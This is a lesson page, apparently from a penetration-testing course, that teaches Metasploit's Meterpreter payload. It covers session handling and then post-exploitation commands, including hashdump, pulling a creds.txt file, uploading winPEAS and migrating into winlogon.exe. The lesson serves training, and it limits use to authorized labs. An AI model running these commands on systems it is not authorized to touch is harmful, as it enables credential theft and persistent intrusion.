@@ -1,0 +1,99 @@
+---
+title: Meterpreter
+module: metasploit
+moduleTitle: The Metasploit Framework
+moduleOrder: 17
+moduleIcon: Zap
+order: 3
+summary: The payload that turns a shell into a workstation you fully control.
+estimatedMinutes: 15
+objectives:
+  - Explain what Meterpreter is and why it beats a raw shell
+  - Manage multiple sessions from one console
+  - Run the post-access commands you reach for first
+tags:
+  - metasploit
+  - meterpreter
+  - sessions
+---
+
+The exploit lands and you see `meterpreter >`. That prompt is worth more than a plain `$`. Meterpreter is Metasploit's own payload, an in-memory agent that runs inside the exploited process and speaks an encrypted protocol back to your console. It never touches disk as a file, and it gives you file transfer, screenshots, credential dumping, and pivoting from one interface.
+
+Compare that to a netcat shell, which is just a raw command prompt piped over TCP. That plain shell drops if the connection hiccups, has no upload command, and paints your commands in cleartext across the wire. Meterpreter fixes all three. When you have a choice of payload, choose Meterpreter.
+
+## Sessions are your inventory
+
+Every successful callback becomes a numbered session. You can hold several at once, drop back to the console to launch another attack, and jump between them freely. That is why `background` matters: it parks the current Meterpreter without killing it and returns you to the `msf6` prompt.
+
+<CommandBlock
+  title="msf6 / meterpreter"
+  commands={[
+    { cmd: "background", comment: "from meterpreter: park this session, return to console" },
+    { cmd: "sessions", comment: "list every live session with its ID and target" },
+    { cmd: "sessions -i 2", comment: "interact with (re-enter) session 2" },
+    { cmd: "sessions -k 3", comment: "kill session 3 when you're done with it" },
+  ]}
+/>
+
+<ExpectedOutput label="A populated session list">
+```
+  Id  Type                   Information              Connection
+  --  ----                   -----------              ----------
+  1   meterpreter x64/win    NT AUTHORITY\SYSTEM @ WS  10.10.14.7 -> 10.10.10.5
+  2   shell cmd/unix         www-data @ web01          10.10.14.7 -> 10.10.10.8
+```
+</ExpectedOutput>
+
+## The first five minutes on a box
+
+Once you're in, a short routine tells you who you are and what you can do. Run these in order and you'll know your footing before you touch anything sensitive.
+
+- **getuid** prints the account you're running as. `NT AUTHORITY\SYSTEM` means you already own the box; a service account means you have escalation work to do.
+- **sysinfo** gives the OS, build, and architecture, which decides what escalation exploits apply.
+- **getprivs** lists the privileges your token holds, like `SeImpersonatePrivilege`, a direct path to SYSTEM.
+- **pwd** and **ls** orient you in the filesystem so you know where you landed.
+
+<CommandBlock
+  title="meterpreter"
+  commands={[
+    { cmd: "getuid", comment: "which user am I?" },
+    { cmd: "sysinfo", comment: "OS, arch, hostname" },
+    { cmd: "ps", comment: "running processes with PIDs and owners" },
+    { cmd: "hashdump", comment: "dump local SAM hashes (needs SYSTEM)" },
+  ]}
+/>
+
+## Moving files and yourself
+
+Meterpreter has built-in file transfer, so you never juggle a Python web server just to pull one file. `download` grabs a file to your Kali box, `upload` pushes one to the target, and `shell` drops you into a native cmd or bash when you need a tool Meterpreter doesn't wrap.
+
+If your session is running inside a fragile process, like a browser that might close, migrate into something stable such as `explorer.exe` or `winlogon.exe`. Find a target PID with `ps`, then `migrate 1084`. Do this early, because losing the process means losing the session.
+
+<CommandBlock
+  title="meterpreter"
+  commands={[
+    { cmd: "download C:\\\\Users\\\\admin\\\\Desktop\\\\creds.txt", comment: "pull a file to your loot dir" },
+    { cmd: "upload /usr/bin/winpeas.exe C:\\\\Windows\\\\Temp\\\\wp.exe", comment: "push a tool up" },
+    { cmd: "migrate 1084", comment: "move into a stable process by PID" },
+    { cmd: "shell", comment: "drop to a native OS shell" },
+  ]}
+/>
+
+<Callout type="security" title="Authorized targets only">
+Migrating processes, dumping hashes, and reading a user's files are intrusive actions with real impact on a real person's machine. Run them only on lab VMs, CTF boxes, or hosts covered by a written engagement scope. Treat any credential you pull as sensitive data you are responsible for.
+</Callout>
+
+<Quiz
+  id="meterpreter-background"
+  question="You're in a Meterpreter session and want to launch a second exploit at a different host without losing this one. What do you type first?"
+  answer={1}
+  options={[
+    "exit",
+    "background",
+    "sessions -k",
+    "shell",
+  ]}
+  explanation="background parks the current session and drops you to the msf6 console so you can run another module. exit and sessions -k would kill the session; shell just opens a native prompt inside it."
+/>
+
+<Notes />
